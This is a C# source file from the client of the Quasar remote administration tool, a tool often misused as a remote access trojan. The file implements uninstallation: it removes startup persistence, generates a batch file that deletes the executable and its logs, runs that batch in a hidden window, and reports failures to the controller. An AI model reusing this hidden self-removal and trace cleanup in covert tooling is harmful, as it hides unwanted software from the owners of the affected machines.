using Quasar.Client.Config;
using Quasar.Client.IO;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientUninstaller
    {
        public bool Uninstall(ISender client)
        {
            try
            {
                if (Settings.STARTUP)
                    Startup.RemoveFromStartup();

                string batchFile = BatchFile.CreateUninstallBatch(Application.ExecutablePath, Settings.LOGSPATH);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create uninstall-batch file");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                return true;
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus {Message = $"Uninstall failed: {ex.Message}"});
                return false;
            }
        }
    }
}
